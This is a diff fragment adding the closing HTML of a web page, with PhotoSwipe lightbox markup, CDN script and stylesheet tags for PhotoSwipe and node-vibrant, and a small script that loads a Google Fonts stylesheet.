+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
